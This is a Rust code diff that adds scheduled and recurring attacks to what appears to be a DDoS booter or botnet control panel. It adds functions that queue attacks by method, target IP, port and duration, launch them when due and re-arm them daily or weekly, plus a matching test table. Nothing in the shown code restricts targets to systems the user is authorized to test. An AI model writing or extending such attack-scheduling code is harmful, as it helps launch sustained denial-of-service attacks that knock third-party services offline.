@@ -363,6 +363,100 @@ impl AttackManager {
             error!("Failed to cleanup stale attacks: {}", e);
         }
     }
+
+    pub async fn schedule_attack(
+        &self,
+        method: String,
+        ip: IpAddr,
+        port: u16,
+        duration_secs: u64,
+        username: String,
+        schedule_time: chrono::DateTime<chrono::Utc>,
+        recurrence: Option<String>,
+    ) -> Result<i64, String> {
+        if duration_secs > self.max_duration_secs {
+            return Err(format!("Attack duration exceeds maximum allowed: {}s > {}s", duration_secs, self.max_duration_secs));
+        }
+        let normalized_method = method.to_uppercase();
+        if !VALID_ATTACK_METHODS.contains(&normalized_method.as_str()) {
+            return Err(format!("Invalid attack method: {}", method));
+        }
+        
+        let ip_str = ip.to_string();
+        let id = sqlx::query("INSERT INTO scheduled_attacks (method, target_ip, target_port, duration, username, schedule_time, recurrence) VALUES (?, ?, ?, ?, ?, ?, ?)
+")
+            .bind(normalized_method)
+            .bind(ip_str)
+            .bind(port)
+            .bind(duration_secs as i64)
+            .bind(username)
+            .bind(schedule_time)
+            .bind(recurrence)
+            .execute(&self.pool)
+            .await
+            .map_err(|e| format!("Database error: {}", e))?
+            .last_insert_rowid();
+            
+        Ok(id)
+    }
+
+    pub async fn process_scheduled_attacks(&self) {
+        let now = chrono::Utc::now();
+        let rows = match sqlx::query("SELECT id, method, target_ip, target_port, duration, username, recurrence FROM scheduled_attacks WHERE status = 'pending' AND schedule_time <= ?")
+            .bind(now)
+            .fetch_all(&self.pool)
+            .await 
+        {
+            Ok(rows) => rows,
+            Err(e) => {
+                error!("Failed to fetch scheduled attacks: {}", e);
+                return;
+            }
+        };
+
+        for row in rows {
+            let id: i64 = row.get("id");
+            let method: String = row.get("method");
+            let ip_str: String = row.get("target_ip");
+            let port: u16 = row.get("target_port");
+            let duration: i64 = row.get("duration");
+            let username: String = row.get("username");
+            let recurrence: Option<String> = row.get("recurrence");
+
+            if let Ok(ip) = ip_str.parse::<IpAddr>() {
+                let level_str: Option<String> = sqlx::query_scalar("SELECT role FROM users WHERE username = ?")
+                    .bind(&username)
+                    .fetch_optional(&self.pool)
+                    .await
+                    .unwrap_or(None);
+                
+                let level = level_str.map(|s| Level::from_str(&s)).unwrap_or(Level::Basic);
+
+                match self.start_attack(method.clone(), ip, port, duration as u64, username.clone(), level, 0).await {
+                    Ok(_) => {
+                        let _ = sqlx::query("UPDATE scheduled_attacks SET status = 'executed' WHERE id = ?")
+                            .bind(id)
+                            .execute(&self.pool)
+                            .await;
+                            
+                        if let Some(rec) = recurrence {
+                            let next_time = match rec.as_str() {
+                                "daily" => now + chrono::Duration::days(1),
+                                "weekly" => now + chrono::Duration::weeks(1),
+                                _ => now 
+                            };
+                            if next_time > now {
+                                let _ = self.schedule_attack(method, ip, port, duration as u64, username, next_time, Some(rec)).await;
+                            }
+                        }
+                    },
+                    Err(e) => {
+                        error!("Failed to execute scheduled attack {}: {}", id, e);
+                    }
+                }
+            }
+        }
+    }
 }
 #[cfg(test)]
 mod tests {
@@ -387,6 +481,24 @@ mod tests {
                 finished_at DATETIME,
                 status TEXT DEFAULT 'running',
                 bot_count INTEGER DEFAULT 0
+            );
+            "#
+        )
+        .execute(&pool)
+        .await
+        .expect("Failed to create schema");
+        sqlx::query(
+            r#"
+            CREATE TABLE scheduled_attacks (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                method TEXT NOT NULL,
+                target_ip TEXT NOT NULL,
+                target_port INTEGER NOT NULL,
+                duration INTEGER NOT NULL,
+                username TEXT NOT NULL,
+                schedule_time DATETIME NOT NULL,
+                recurrence TEXT,
+                status TEXT DEFAULT 'pending'
             );
             "#
         )
